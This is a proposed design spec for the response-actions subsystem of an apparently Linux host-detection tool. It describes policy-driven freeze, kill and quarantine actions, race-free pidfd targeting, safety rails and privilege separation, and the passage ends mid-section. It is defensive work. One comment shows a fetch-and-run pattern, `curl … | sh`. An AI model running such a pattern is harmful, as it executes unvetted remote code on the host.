# Response actions - design spec

Status: **proposal, not implemented.** Nothing in this document exists in the code yet. It is written
against the tree as of 2026-10-31 (`17c1d21`), and every "today" claim below was checked against
that tree, not remembered.

banken today is alert-only. This is the design for the subsystem that lets it *act* on an alert:
freeze or kill a process, quarantine a file, and later isolate a process from the network and
collect evidence. It is held to the same bar as the rest of the tree - simple, no rough edges,
honest, reversible where possible - and to the README's existing promise: **response actions are
operator policy keyed off a rule tag, never embedded in a rule.**

The one-sentence shape: **a pure, fixture-tested decision function turns (alert, policy) into a
decided action; a tiny, separately-sandboxed executor performs it with race-free Linux primitives;
every decision and every action is written to an append-only ledger, in observe mode too.**

---

## 1. Goals, non-goals, and the honesty clause

**Goals**

1. "Does this alert trigger a kill?" is as testable as "does this event fire a rule?" - a fixture
   corpus, no real process ever touched.
2. Reversible before destructive: `freeze` is a first-class action, recommended over `kill`.
3. The scan process gains **no** new privilege. Only a small executor wields kill/freeze/quarantine.
4. Default is observe: a fresh install never surprise-kills. Enforcement is an explicit, auditable
   operator decision, and a kill-switch stops it instantly without a config rebuild.
5. Hard rails that no rule, policy or bug can cross: never pid 1, never the init system, never sshd,
   never banken itself.
6. Chain of custody: who decided what, from which alert, under which policy, and what happened.

**Non-goals (for this version)**

- Prevention. banken is a one-shot scan on a timer that reads a log *after* the fact. A response
  here lands up to one interval after the event, never before it. Blocking an exec or an open
  (fanotify permission events, eBPF LSM) needs a resident process and is explicitly deferred to
  `--watch` mode (§5.5).
- Host-wide network isolation and evidence collection are reserved action names with a defined
  seam; they are not designed in detail here (§5.6).
- Windows and macOS. One section (§5.7) names the equivalent primitives so the interfaces are not
  Linux-shaped by accident; the executor is Linux-only.

**Honesty clause.** Where a thing cannot be done cleanly it is said so, with the consequence, rather
than smoothed over. The list: the one-interval latency (above); auditd and Laurel carry no process
start time (§6); cgroup freeze is per-cgroup, not per-process, so freezing means *moving* the
process (§5.2); file quarantine by rename is same-filesystem only (§5.4); fanotify blocking needs a
daemon (§5.5); a root-level attacker can undo any of this and the defence against that is the
ledger plus the existing `tamper_banken` rule, not the action itself (§9).

---

## 2. Where it plugs in

Exactly one place, the one the code already reserves:

```go
// internal/alert/alert.go - exists today
type Responder interface {
    Respond(a Alert) error
}
func (d *Dispatcher) SetResponder(r Responder)
```

`Dispatch` calls the responder before the sinks and collects its error alongside the sinks'
errors; a responder failure never suppresses an alert. That contract is kept as-is. No sink, parser
or matcher changes.

```
 event ─► engine.Match ─► alert ─► Dispatcher ─┬─► Responder  = response.Responder
                                               │      │  Decide (pure)  ──► ledger: "decided"
                                               │      │  if Action != none:
                                               │      │     enqueue work order ──► ledger: "requested"
                                               │      ▼
                                               │   /var/lib/banken/spool/<id>.json
                                               │          │  (path unit fires)
                                               │          ▼
                                               │   banken-respond.service  (separate unit, privileged)
                                               │     re-Decide ─► execute via Executor ─► ledger: "executed"|"failed"
                                               │
                                               └─► sinks (journal / jsonl / webhook) as today
```

Two processes, one binary. The scan (`banken`) decides and *asks*; the executor (`banken respond
drain`, a second systemd unit) verifies and *acts*. The scan keeps its current sandbox to the byte.

---

## 3. Architecture: decision layer vs execution layer

### 3.1 Packages

| Package | Contents | Side effects |
| --- | --- | --- |
| `internal/response` | `Policy` (YAML types, load, validate), `Decide` (pure), `Responder` (the `alert.Responder`), `Ledger`, `Spool` | writes ledger + spool files only |
| `internal/response/exec` | `Executor` interface, `Fake` (tests), `linux.go` (pidfd, cgroup, quarantine), `other.go` (`ErrUnsupported`) | the only package that signals, freezes, renames |
| `main.go` + `respond.go` | `banken respond drain|list|thaw|restore|explain` subcommands | - |

`internal/response` must not import `internal/response/exec`. The decision layer cannot reach a
primitive even by accident; the dependency arrow only points the other way (the executor imports
the decision types to re-validate).

### 3.2 The decision layer (pure)

Everything the decision needs is passed in as plain data. No clock, no filesystem, no `/proc`, no
globals. Same input, same output, forever - that is what makes it fixture-testable.

```go
package response

// Action is what the policy can ask for. Reserved actions are rejected at
// policy load (a clear error, like an unsupported Sigma modifier), never
// silently accepted.
type Action string

const (
    ActionNone       Action = "none"
    ActionFreeze     Action = "freeze"     // reversible: cgroup v2 freezer, SIGSTOP fallback
    ActionKill       Action = "kill"       // destructive: pidfd_send_signal(SIGKILL) / cgroup.kill
    ActionQuarantine Action = "quarantine" // reversible: rename into quarantine dir, or in-place neuter
    ActionIsolate    Action = "isolate"    // reserved (v2): per-cgroup nft drop
    ActionCollect    Action = "collect"    // reserved (v2): snapshot /proc + exe before acting
)

// Rail names the safety rail that downgraded Intended to Action. Empty
// means no rail fired. Every rail is a string so it lands in the ledger
// and in a fixture's expectation verbatim.
type Rail string

const (
    RailNone            Rail = ""
    RailNoPolicyMatch   Rail = "no-policy-match"
    RailBelowMinLevel   Rail = "below-min-level"
    RailUntrustedSource Rail = "untrusted-source"
    RailUntargetable    Rail = "untargetable"
    RailDenylist        Rail = "denylist"
    RailDuplicate       Rail = "duplicate"
    RailRateLimit       Rail = "rate-limit"
    RailKillSwitch      Rail = "kill-switch"
    RailObserve         Rail = "observe-mode"
)

// ProcessRef is the identity the executor must re-verify before acting.
// PID alone is never enough (§5.1).
type ProcessRef struct {
    PID       int       `json:"pid"`
    PPID      int       `json:"ppid,omitempty"`
    StartTime time.Time `json:"startTime,omitempty"` // zero = unknown (auditd/Laurel)
    Image     string    `json:"image"`
    User      string    `json:"user,omitempty"`
    EventTime time.Time `json:"eventTime"`           // upper bound on StartTime when unknown
}

type FileRef struct {
    Path string `json:"path"` // as the event saw it; the executor opens O_NOFOLLOW and acts on the fd
}

type Target struct {
    Process *ProcessRef `json:"process,omitempty"`
    File    *FileRef    `json:"file,omitempty"`
}

// Budget is the rate-limit state the caller has already accumulated. It is
// an input, not hidden state, so Decide stays pure.
type Budget struct {
    RunUsed, RunLimit   int
    HourUsed, HourLimit int
}

// Input is everything Decide looks at.
type Input struct {
    Alert      alert.Alert
    Policy     Policy
    Self       SelfIdentity // banken's own exe path(s); for the denylist
    KillSwitch bool         // the caller stat'ed Policy.KillSwitchPath
    Budget     Budget
    Seen       []Target     // targets already decided this run (dedupe)
}

type SelfIdentity struct {
    Exe string // realpath of /proc/self/exe
}

// Decision is the whole verdict. Intended is what the policy asked for
// before any rail; Action is what will happen. In observe mode they differ
// on purpose, and the ledger records both.
type Decision struct {
    Intended Action `json:"intended"`
    Action   Action `json:"action"`
    Rail     Rail   `json:"rail,omitempty"`
    Reason   string `json:"reason"`          // one human line
    Entry    string `json:"entry,omitempty"` // policy entry name that matched
    Target   Target `json:"target"`
    Scope    string `json:"scope,omitempty"` // "process" | "tree" (for freeze/kill)
}

// Decide is pure and deterministic. It never returns an error: a malformed
// input is a decision of none with a Rail and Reason saying why, because a
// response layer that can "error out" is one that can be made to skip.
func Decide(in Input) Decision
```

**The order of evaluation is part of the contract** (fixtures depend on it):

1. **Policy match** - first entry in `actions:` whose selector matches the alert, in file order.
   No match → `Intended = none`, `Rail = no-policy-match`, stop.
2. **Min level** - the entry's `minLevel` (default: policy `minLevel`, default `high`). Below → rail.
3. **Trusted source** - `Alert.Source` must be in `enforceSources` (default `[auditd, laurel]`).
   The generic-JSONL source is whatever a collector wrote; a forged line there must never become a
   kill (§9). Not in the list → rail.
4. **Targetable** - the action needs a `ProcessRef` with `PID > 0` (freeze/kill) or a `FileRef`
   with a non-empty path inside `quarantine.allowPaths` (quarantine). Missing → rail
   `untargetable`, Reason says which field. This is where "Event has no pid" shows up today (§6).
5. **Denylist** - built-in list ∪ `denylist:` from policy (§7.2). Hit → rail `denylist`.
6. **Duplicate** - same `Target` already in `Seen` this run → rail.
7. **Rate limit** - `Budget` exhausted → rail.
8. **Kill-switch** - `KillSwitch` true → rail.
9. **Mode** - `observe` → rail `observe-mode`, `Action = none`. `enforce` → `Action = Intended`.

Rails 2-8 run *before* the mode check deliberately: an observe-mode ledger shows exactly which rail
would have stopped an enforce-mode action, so an operator can tune the policy for a week on real
traffic before flipping the switch and get no surprises when they do.

### 3.3 The execution layer

```go
package exec

// Handle is what the ledger stores to undo an action. Undo is a path or
// id the executor understands (a cgroup dir, a quarantine dir); it is
// opaque to everyone else.
type Handle struct {
    ID   string          `json:"id"`
    Kind response.Action `json:"kind"`
    Undo string          `json:"undo,omitempty"`
}

// Executor performs one primitive. Every method is idempotent on its
// target: freezing a frozen tree, killing a dead pid, or quarantining an
// already-quarantined file returns the existing Handle and no error, so a
// crashed-and-rerun drain is safe.
type Executor interface {
    // Verify re-identifies the process (§5.1) without acting. Kill/Freeze
    // call it internally; it is exposed so `banken respond explain` can
    // show what would be targeted.
    Verify(ctx context.Context, p response.ProcessRef) (Live, error)

    Freeze(ctx context.Context, p response.ProcessRef, scope Scope) (Handle, error)
    Thaw(ctx context.Context, h Handle) error

    Kill(ctx context.Context, p response.ProcessRef, scope Scope) (Handle, error)

    Quarantine(ctx context.Context, f response.FileRef) (Handle, error)
    Restore(ctx context.Context, h Handle) error
}

type Scope string // "process" | "tree"

// Live is what Verify established about the process right now.
type Live struct {
    PID       int
    StartTime time.Time
    Exe       string
    CgroupPath string
}

var (
    ErrStaleTarget = errors.New("exec: target is not the process the alert described")
    ErrGone        = errors.New("exec: target already exited")
    ErrUnsupported = errors.New("exec: not supported on this platform")
)

// New returns the platform executor. On non-Linux every method returns
// ErrUnsupported; the binary still builds and `go test ./...` still passes
// on a Mac with the Fake.
func New(cfg Config) (Executor, error)
```

`Fake` (in `exec/fake.go`, not behind a build tag so every package can use it) records every call in
order, can be scripted to return a given error per method, and never touches the OS.

### 3.4 The responder (scan side)

```go
package response

// Responder implements alert.Responder. It never performs an action; it
// decides, records, and enqueues.
type Responder struct { /* policy, self, ledger, spool, killSwitch func() bool, budget, seen */ }

func NewResponder(p Policy, self SelfIdentity, ledger *Ledger, spool *Spool, now func() time.Time) *Responder

// Respond: Decide → ledger "decided" → if Action != none, write a work
// order to the spool → ledger "requested". Runs under a recover like
// engine.safeMatch: a bug here takes out one alert's response, never the
// scan, and is surfaced as an error, not swallowed.
func (r *Responder) Respond(a alert.Alert) error
```

### 3.5 The drain (executor side)

`banken respond drain` runs as `banken-respond.service` (§8). For each work order in the spool, in
filename (= ULID = time) order:

1. Load the policy from disk **itself** (never from the work order) and recompute `Decide` with its
   own `Input` (fresh kill-switch stat, fresh `Budget` from today's ledger, `Seen` from today's
   ledger). It acts only if its own decision's `Action` equals the work order's. A work order can
   only ever *lower* what happens, never raise it. This is defence in depth against the scan
   process - the thing that parses untrusted bytes - being wrong or compromised.
2. Reject a work order older than `spool.maxAge` (default `10m`) as `expired`. A backlog of kills
   must not land after the operator has moved on.
3. `Executor.<Action>` → ledger `executed` (with `Handle`) or `failed` (with the error, including
   `ErrStaleTarget` / `ErrGone`, which are *good* outcomes to see in a ledger).
4. Delete the work order. A crash between 3 and 4 is covered by executor idempotence.

---

## 4. Policy: the operator config

Lives in the existing YAML config under a new `response:` key, same camelCase style as `alerts:`,
rendered by the NixOS module from options like everything else. Loaded by `config.Load`; validated by
`response.Validate` with the Sigma loader's discipline: an unknown key, action, mode or target is a
**load error naming the key**, never a silent default.

```yaml
# /etc/banken/banken.yml  (excerpt)
response:
  mode: observe                       # observe | enforce.  Default observe. Nothing acts in observe.
  killSwitchPath: /run/banken/disable # if this file exists, nothing acts (touch it to stop; tmpfs, so a
                                      # reboot clears it). Checked by scan AND executor, every time.
  minLevel: high                      # default floor for every entry
  enforceSources: [auditd, laurel]    # alerts from any other source (generic JSONL!) are observe-only
  rateLimit:
    perRun: 3                         # actions one scan may request
    perHour: 10                       # actions the executor may perform (counted from the ledger)
  denylist:                           # ADDED to the built-in list (§7.2); cannot remove from it
    images:
      - /run/current-system/sw/bin/tailscaled
    users: [conor]                    # never act on this user's processes
  quarantine:
    dir: /var/lib/banken/quarantine   # same filesystem as the target or the in-place fallback is used
    allowPaths: [/tmp, /var/tmp, /dev/shm, /home, /root, /opt]  # only files under these; never /nix/store, /usr, /etc
  actions:
    # Evaluated in order; first selector that matches wins. `name` is for the ledger.
    - name: freeze-revshell
      rules: [reverse_shell]          # exact rule names (file basename) - pins the policy to a rule
      action: freeze
      scope: tree                     # freeze the process and its descendants
    - name: freeze-c2-by-tag
      tag: attack.command-and-control # a Sigma tag the rule carries; any rule may carry one
      action: freeze
    - name: quarantine-dropper
      rules: [download_ip_to_tmp]
      action: quarantine
      target: targetFilename          # image | targetFilename
    - name: kill-miner
      rules: [xmrig_dropper]          # kill MUST be pinned by rule name (see rule below)
      action: kill
      scope: tree
```

**Selectors.** `rules:` (exact names), `tag:` (a Sigma `tags:` entry), or both (AND). A rule only
*emits* tags; the mapping to an action is here and only here, so the action set is a local,
auditable file a remote rule can never carry.

**The one asymmetry, stated plainly.** A remote rule can tag itself `attack.command-and-control`.
If the operator mapped that tag to `kill`, a rogue rule could earn itself a kill on any process it
matches. So: **a tag-only selector may map to a reversible action (`freeze`, `quarantine`, later
`isolate`/`collect`); `kill` requires `rules:`.** `Validate` rejects a tag-only `kill` entry with
the reason in the message. A remote rule can at worst earn a freeze, which thaws.

**Validation rules** (all load errors): mode ∉ {observe, enforce}; action ∉ implemented set
(`isolate`/`collect` say "reserved, not implemented in this version"); `kill` without `rules:`;
`quarantine` with `target: process` or freeze/kill with `target: targetFilename`; an `allowPaths`
entry that is not absolute, or that lies under a built-in never-quarantine prefix; `rateLimit`
≤ 0; a `rules:` name that no loaded rule has (warning, not error - rule trees are loaded on top of
each other, and a typo in a kill pin should be loud).

**Policy hash.** `sha256` of the canonical `response:` block is computed at load and written on every
ledger line, so each decision is tied to the exact policy text that produced it.

### 4.1 Dependency: rule tags into the alert

`sigma.Rule` has no `Tags` field today; `tags:` in a rule file (e.g. `tamper_banken.yml`) is parsed
by `yaml.v3` into nothing. Needed:

- `sigma.Rule.Tags []string` populated from `tags:` (strings only; anything else is a load error).
- `alert.Alert.Tags []string \`json:"tags,omitempty"\`` copied in `engine.Match`. It rides along to
  the jsonl/webhook sinks too, which is a small, welcome improvement on its own.

---

## 5. Actions: primitive and safety model, one by one

### 5.1 Targeting a process without the pid-reuse race (shared by freeze and kill)

`kill(pid)` is forbidden in this codebase. The pid in an alert is minutes old; it may belong to a
different process by now. The executor:

1. `pidfd_open(pid, 0)` → fd. From here on the fd names *one* process for its lifetime, whatever
   happens to the pid number. `ESRCH` → `ErrGone`.
2. Read `/proc/<pid>/stat` (field 22 `starttime`, in clock ticks since boot; convert via `btime` and
   `CLK_TCK`) and `readlink /proc/<pid>/exe`.
3. `poll(pidfd, 0)`: `POLLIN` means the process the fd refers to has exited. If so → `ErrGone`
   (step 2 may have read a *successor's* `/proc` entry; discard it).
4. Because the fd's process is still alive (not even reaped), the pid cannot have been reused, so
   the `/proc/<pid>` read in step 2 described the same process. Now verify identity:
   - if `ProcessRef.StartTime` is known: `|starttime - ref.StartTime| ≤ 1 tick`;
   - if unknown (auditd, Laurel): `starttime ≤ ref.EventTime + skew` (default 2s). This is sound,
     not a heuristic: a pid can only be reused after its previous holder exits, and the holder
     described by the alert was alive at `EventTime`, so any reuser was forked *after*
     `EventTime` and fails the bound. The only thing that breaks it is a backwards wall-clock
     step between the event and now, which is why there is a tolerance and why the `exe`
     comparison below exists.
   - `exe` is compared to `ProcessRef.Image` and the mismatch is recorded in the ledger but is
     **not** a refusal: a shell legitimately execs on (`bash -c 'curl … | sh'`), same pid, same
     start time, same lineage.
   Any failure → `ErrStaleTarget`. Refusing is always preferred to acting on the wrong process.
5. Act **through the fd**: `pidfd_send_signal(pidfd, SIGKILL, NULL, 0)`. Never `kill(2)`.

Newer kernels expose `PIDFD_GET_INFO` (an ioctl on the pidfd returning pid/ppid/exit info) which can
replace the `/proc` read; treat it as an optimisation to verify on the target kernel, not a
dependency.

A `ProcessRef` with `PID == 0` is *untargetable* at the decision stage and never reaches here.

### 5.2 `freeze` - reversible containment (the recommended default)

**Primitive.** cgroup v2 freezer: write `1` to `cgroup.freeze`; `cgroup.events` reports `frozen 1`
when done. Frozen tasks keep their memory, fds, sockets and credentials; an analyst can read
`/proc/<pid>/{maps,environ,fd,cmdline}` and dump memory at leisure; `thaw` writes `0` and the
process continues as if nothing happened. It cannot be undone by the process, its parent or a
`SIGCONT` from a watchdog, and it freezes the whole tree.

**The honest complication.** Freezing is per-cgroup, and the target's cgroup is almost never its
own: an interactive shell's reverse shell lives in `session-N.scope` next to the user's sshd
session leader, a service's child lives in its unit's cgroup. Freezing in place would freeze the
operator's own session. So freeze means **move, then freeze** - or rather, freeze an empty cgroup
first and move into it (a task migrated into a frozen cgroup is frozen on arrival, closing the
fork-while-migrating gap):

1. `mkdir /sys/fs/cgroup/banken.quarantine/<handle-id>`; write `1` to its `cgroup.freeze`.
2. Collect the target's descendant set from `/proc/<pid>/task/*/children` (`CONFIG_PROC_CHILDREN`)
   or a `/proc` ppid walk; write each pid to the new cgroup's `cgroup.procs`.
3. Repeat step 2 until a pass finds no new descendants (a child forked by a not-yet-moved
   descendant between passes is caught on the next; one forked by an already-moved - frozen -
   parent cannot exist). Bound the loop (default 5 passes) and record the pass count.
4. Confirm `cgroup.events` → `frozen 1`. Record the *original* cgroup path of each moved pid in the
   `Handle` so `thaw` can move them back, then unfreeze (order matters: move back first, so a
   thawed process never spends an instant running in the quarantine cgroup).

`scope: process` moves only the target pid; `scope: tree` (default for freeze) moves descendants
too.

**Where the cgroup lives.** `banken.quarantine/` is a plain directory under the cgroup v2 root,
outside systemd's slice tree. systemd manages only cgroups it created and leaves foreign root-level
subtrees alone; this is the same arrangement container runtimes use. The alternative - asking
systemd for a transient scope over D-Bus (`StartTransientUnit` with `PIDs=`, then
`systemctl freeze <scope>`) - is more "blessed" but adds a D-Bus client dependency and makes
migrating late-forked children awkward. **Open question §10.1.** Either way the executor's own
service cgroup is *never* used to hold frozen processes: a oneshot unit's cgroup is torn down when
it exits, and frozen tasks are still killable by SIGKILL.

**systemd bookkeeping, stated.** A process moved out of its unit's cgroup is no longer accounted to
that unit: `systemctl stop that.service` will not reach it, and `systemctl status` will not list
it. `banken respond list` does. `thaw` puts it back. This is a real, documented edge, not hidden.

**Fallback when there is no v2 freezer** (cgroup v1 host, or no write access): `SIGSTOP` via
`pidfd_send_signal`, per process, with `scope: tree` applied by stopping each descendant found in
the same bounded walk. Weaker - a parent can `SIGCONT` it and a child forked between the walk and
the stop escapes - and the ledger line says `method: sigstop` so nobody mistakes it for the real
thing. Thaw is `SIGCONT`.

**Reboot.** Frozen processes do not survive a reboot; the handle becomes `thaw: not-applicable`
(the drain notices `/proc/sys/kernel/random/boot_id` changed since the ledger line was written).

### 5.3 `kill` - destructive

- `scope: process`: §5.1 then `pidfd_send_signal(SIGKILL)`. No SIGTERM-then-wait: a malicious
  process handles SIGTERM, and a half-measure that "usually works" is a rough edge. If an
  operator wants a graceful stop they want a freeze and a human.
- `scope: tree`: the §5.2 move into a frozen `banken.quarantine/<id>` cgroup, then write `1` to
  `cgroup.kill` (Linux 5.14+), which kills every task in the cgroup atomically, including any
  that would have forked. Without `cgroup.kill`, fall back to per-pid pidfd kills over the frozen
  set (frozen tasks still die to SIGKILL). Then `rmdir` the cgroup.
- The `Handle` for a kill has no undo; the ledger says so explicitly rather than leaving the field
  empty.

**Recommendation written into the example policy:** map detections to `freeze` first. Graduate a
specific rule to `kill` only after a week of observe-mode ledger shows no false positive on it.

### 5.4 `quarantine` - reversible, metadata-preserving, TOCTOU-bounded

The event carries a *path* (`TargetFilename` or `Image`), not an inode. By the time the executor
runs, that path may be a different file. The executor never acts on a re-resolved path blindly:

1. Check the path is under `quarantine.allowPaths` and not under a built-in never-touch prefix
   (`/nix/store`, `/usr`, `/bin`, `/sbin`, `/lib*`, `/etc`, `/boot`, `/proc`, `/sys`, `/dev` except
   `/dev/shm`, `/run`) - already enforced at decision time, re-checked here.
2. `open(path, O_PATH | O_NOFOLLOW | O_CLOEXEC)` → fd. Symlink → refuse (`ErrStaleTarget`:
   "path is a symlink"). `fstat`: must be a regular file, not a directory/device/socket; record
   `(dev, ino, mode, uid, gid, size, mtime, nlink)`. `nlink > 1` is recorded (other names remain)
   but not refused. Compute `sha256` through a second `open(O_RDONLY)` of `/proc/self/fd/<fd>`
   (same inode by construction).
3. **Primary - atomic rename, same filesystem.** `renameat2(AT_FDCWD, path, qdirfd, "<id>/file",
   RENAME_NOREPLACE)`. Rename keeps the inode, so owner, mode, timestamps and xattrs are preserved
   with nothing to copy and nothing to get wrong. Then `openat(qdirfd, "<id>/file", O_PATH)`,
   `fstat`, and compare `(dev, ino)` with step 2. **If they differ, the wrong file was moved
   (the directory entry was swapped between 2 and 3): rename it straight back, record
   `failed: stale target`, stop.** The window is microseconds and the consequence is recoverable,
   which is why rename is preferred over `linkat`+`unlinkat` (where a wrongly unlinked original
   would be gone for good).
4. **Fallback - `EXDEV` (different filesystem, e.g. tmpfs `/tmp` vs `/var`): neuter in place.**
   On the fd from step 2: `fchmod(fd, 0)`, then `ioctl(FS_IOC_SETFLAGS, flags | FS_IMMUTABLE_FL)`
   where the filesystem supports it (ext4/xfs/btrfs; tmpfs since 6.0). The file stays at its path,
   unreadable, unexecutable, unmodifiable and undeletable by anyone without
   `CAP_LINUX_IMMUTABLE`; an attacker cannot re-drop at the same path. The ledger says
   `method: neuter` and whether the immutable bit took. Never copy-then-delete: not atomic, and it
   doubles the evidence surface.
5. Write `<id>/manifest.json` beside the file (or, for neuter, in the quarantine dir alone):
   original path, every stat field, sha256, alert reference, method, time. The quarantine dir is
   `0700 root`.

`restore(handle)`: verify the quarantined entry's `(dev, ino)` still matches the manifest, then
`renameat2(…, RENAME_NOREPLACE)` back to the original path (fails cleanly if something now sits
there; the operator picks a name) - or, for neuter, clear the immutable bit and `fchmod` the
recorded mode. Idempotent: restoring a restored handle is a no-op with a ledger note.

**What quarantine is not.** Renaming a running executable does not stop it (Linux allows it; no
`ETXTBSY`), so pair it with a freeze in policy if that is the intent. `Image` for a script is the
interpreter (`/usr/bin/python3`), which the allowlist blocks; "the dropped script in argv" is a
future enrichment, not something this version pretends to find.

### 5.5 fanotify access-blocking - deferred to `--watch`, and why

`FAN_OPEN_EXEC_PERM` / `FAN_OPEN_PERM` need a resident process to answer each permission event.
banken is one-shot: there is nobody to answer, and an unanswered permission event stalls the
opener until the fanotify fd closes. It is therefore **not an option in the timer model**, and
saying otherwise would be the kind of rough edge this project does not ship. The seam is reserved:
`Executor` gains `Block(ctx, FileRef)` when `--watch` mode is the deployment, and the decision
layer's `Target.File` already carries what it needs.

### 5.6 Reserved: `isolate` and `collect`

Both are action names the policy loader *rejects* today with "reserved, not implemented in this
version", so a config cannot silently ask for something that does nothing.

- `isolate` (process-level network isolation) composes naturally with freeze: once a tree sits in
  `banken.quarantine/<id>`, one nftables rule `socket cgroupv2 level 2 "banken.quarantine/<id>"
  drop` cuts its egress - reversible, scoped, no host-wide impact. Host isolation (allowlist-only
  egress) is a separate, larger decision and interacts with the containment flake's wall; not
  designed here.
- `collect` snapshots evidence before any other action: `/proc/<pid>/{cmdline,environ,maps,status,
  cgroup}`, `fd/` targets, a hard link or copy of `exe` with its hash, and - for a frozen process
  - memory via `process_vm_readv` or `/proc/<pid>/mem`. Output under `/var/lib/banken/evidence/<id>/`
  with a manifest like quarantine's. It is the natural first step of a composite
  (`collect → freeze`), which this version's single-`action` entries do not express
  (**open question §10.5**).

### 5.7 Other OSes, briefly

The interfaces above are deliberately OS-neutral (`ProcessRef`, `FileRef`, `Handle`); only
`exec/linux.go` knows a pidfd from a cgroup.

| | Linux (this spec) | macOS | Windows |
| --- | --- | --- | --- |
| pin process identity | `pidfd_open` | audit token (pid + pidversion) from ESF / `proc_pidinfo`; no fd-based pin | `OpenProcess` handle pins identity like a pidfd |
| kill | `pidfd_send_signal(SIGKILL)` | `kill` after audit-token recheck (racy; no pidfd equivalent) | `TerminateProcess(handle)` |
| freeze | cgroup v2 freezer / `SIGSTOP` | `SIGSTOP` only (no freezer) | `NtSuspendProcess` or a Job object |
| quarantine | `renameat2` / immutable flag | move + `com.apple.quarantine` xattr + `chflags uchg` | move to ACL-denied dir / deny-ACE |
| block exec | fanotify (resident only) | ESF `AUTH_EXEC` deny (entitled, resident daemon) | minifilter / WDAC (out of scope) |

---

## 6. Dependency: pid, ppid and start time on `Event`

This is the real blocker for anything process-targeted, and it is small.

**Today.** `event.Event` has `Image/CommandLine/ParentImage/TargetFilename/User/CurrentDirectory`,
`Time`, `Source`, `Raw`. Both parsers already *see* the numbers and drop them: the auditd parser keeps
every `key=value` of the `SYSCALL` record in `rec.fields` (so `pid` and `ppid` are there); the Laurel
parser reads `SYSCALL.exe` and `SYSCALL.uid` and ignores `SYSCALL.pid`/`SYSCALL.ppid`. **Neither
source carries a process start time** - audit records have none. The event's own timestamp
(`msg=audit(TS:SEQ)` / Laurel `ID`) is already parsed into `Event.Time`, and §5.1 shows that is
enough for a sound reuse check.

**Change.**

```go
// internal/event/event.go - additions
PID  int `json:"pid,omitempty"`  // process id as the source recorded it; 0 = unknown
PPID int `json:"ppid,omitempty"` // parent pid; 0 = unknown
// ProcessStart is when the process was created, for sources that know it
// (eBPF, ESF, Sysmon). Zero for auditd/Laurel; the executor then bounds it
// by Time instead (see docs/design/response-actions.md §5.1).
ProcessStart time.Time `json:"processStart,omitempty"`
```

- `Field()` additionally resolves Sigma's `ProcessId` / `ParentProcessId` to these (as decimal
  strings), which also lets SigmaHQ rules that reference them match; `AllText` keeps excluding
  them (numbers are not keyword text).
- auditd: `pid`/`ppid` from the `SYSCALL` record's fields. Laurel: `SYSCALL.pid`/`.ppid`. Generic
  JSONL: already verbatim once the fields exist.
- Golden files for both parsers gain the two fields; fixtures under `tests/fixtures` may add `pid`
  where it is meaningful (none need to for detection).
- Additive only: an old fixture or collector without the fields still parses, and a `PID == 0`
  alert is simply untargetable (rail, logged), never an error.

**Honest limit:** a pid from auditd is the host pid namespace's. A process inside a container with
its own pid namespace is still addressed correctly (auditd records host pids), but the generic-JSONL
source's pids mean whatever the collector meant, which is one more reason it is observe-only by
default.

---

## 7. Safety rails

### 7.1 Modes and the kill-switch

- `mode: observe` is the default and what the NixOS module renders unless told otherwise. Every
  decision is made, logged with `Intended` and the rail, and nothing is executed. The journal line
  reads `banken: would FREEZE pid 4242 (/tmp/.x/sh) for reverse_shell [observe]` so the operator
  sees enforce-mode behaviour before enabling it.
- `killSwitchPath` (default `/run/banken/disable`): existence disables execution everywhere, checked
  on every decision and by the drain before every action. `touch` it in an incident; no rebuild, no
  restart. On `/run` so a reboot clears it, which is itself logged ("kill-switch cleared by boot").
- `enforceSources`: an alert from a source not listed is observe-only regardless of mode.

### 7.2 Denylist (built in; policy can only add)

Process targets are refused when any of:

- `pid ∈ {1, 2}` or `ppid ∈ {0, 2}` (init, kthreadd and kernel threads).
- `exe` basename ∈ {`systemd`, `init`, `sshd`, `sshd-session`, `auditd`, `laurel`, `systemd-journald`,
  `dbus-daemon`, `dbus-broker`, `login`, `agetty`} or `exe` realpath equals the banken binary
  (`SelfIdentity.Exe`), or the pid is the executor's own or its parent's.
- the process's cgroup is `/init.scope` or the executor's own.
- `user` ∈ `denylist.users`; `exe` ∈ `denylist.images` (policy additions).

File targets are refused when the path is not under `quarantine.allowPaths`, or is under a built-in
never-touch prefix (§5.4), or resolves to a symlink / non-regular file at execution time.

The denylist is evaluated in `Decide` (pure, from the alert's fields) **and again** in the executor
against the live process (its real exe, real cgroup, real uid) - the alert's `Image` is what the
log said, the executor checks what is true now.

### 7.3 Rate limit and dedupe

`rateLimit.perRun` bounds what one scan may *request*; `rateLimit.perHour` bounds what the drain
may *perform* (counted from today's ledger). A target already decided this run is a duplicate. A
burst of 500 alerts from one noisy rule produces 3 actions and 497 `rate-limit` ledger lines, which
is also the signal that the rule needs tuning.

### 7.4 Never-die

`Responder.Respond` runs under a recover (like `safeMatch`); a panic is returned as an error and the
alert still reaches every sink. The drain recovers per work order. A ledger write failure is
reported, never fatal, but a work order is **not** written if its `decided` line could not be -
an action without a record is worse than no action.

---

## 8. Least privilege: who holds what

The scan unit (`banken.service`) stays exactly as it is today - `CapabilityBoundingSet=CAP_DAC_READ_SEARCH`,
`ProtectControlGroups=true`, `ProtectProc=invisible`, `@system-service`. It already has
`StateDirectory=banken`, which covers the spool and ledger under `/var/lib/banken`. **It cannot
signal, freeze or rename anything, by construction**, and that is the point: the process that
parses untrusted bytes keeps no capability worth exploiting.

`banken-respond.service` (new, `Type=oneshot`, `ExecStart=banken respond drain`), started by
`banken-respond.path` (`DirectoryNotEmpty=/var/lib/banken/spool`), is the only privileged piece. It
runs the same binary, one code path (`respond.go` + `exec/`), with its own hardened unit copied from
the scan's and relaxed only where an action needs it:

| Need | Why |
| --- | --- |
| `CAP_KILL` | `pidfd_send_signal` to another uid's process |
| `CAP_SYS_PTRACE` | `readlink /proc/<pid>/exe`, `/proc/<pid>/environ` of other users (`PTRACE_MODE_READ`) |
| `ProtectProc=default` | the scan's `invisible` would hide every other process |
| `ProtectControlGroups=false` + `ReadWritePaths=/sys/fs/cgroup/banken.quarantine` | freezer and `cgroup.kill` writes |
| `CAP_DAC_OVERRIDE`, `CAP_FOWNER` | rename / `fchmod` files owned by others |
| `CAP_LINUX_IMMUTABLE` | the neuter fallback's immutable bit (and clearing it on restore) |
| `ReadWritePaths=` the quarantine dir and `allowPaths` | rename out of / back into them |
| syscall filter | `@system-service` plus `pidfd_open`, `pidfd_send_signal`, `renameat2` - verify against the target systemd's group definitions rather than assuming |
| `CAP_NET_ADMIN` | reserved for `isolate` (v2); not granted until then |

Only the capabilities for *enabled* actions need granting; the NixOS module can derive the set from
the policy (a policy with no `quarantine` entry gets no `CAP_LINUX_IMMUTABLE`). The unit is still
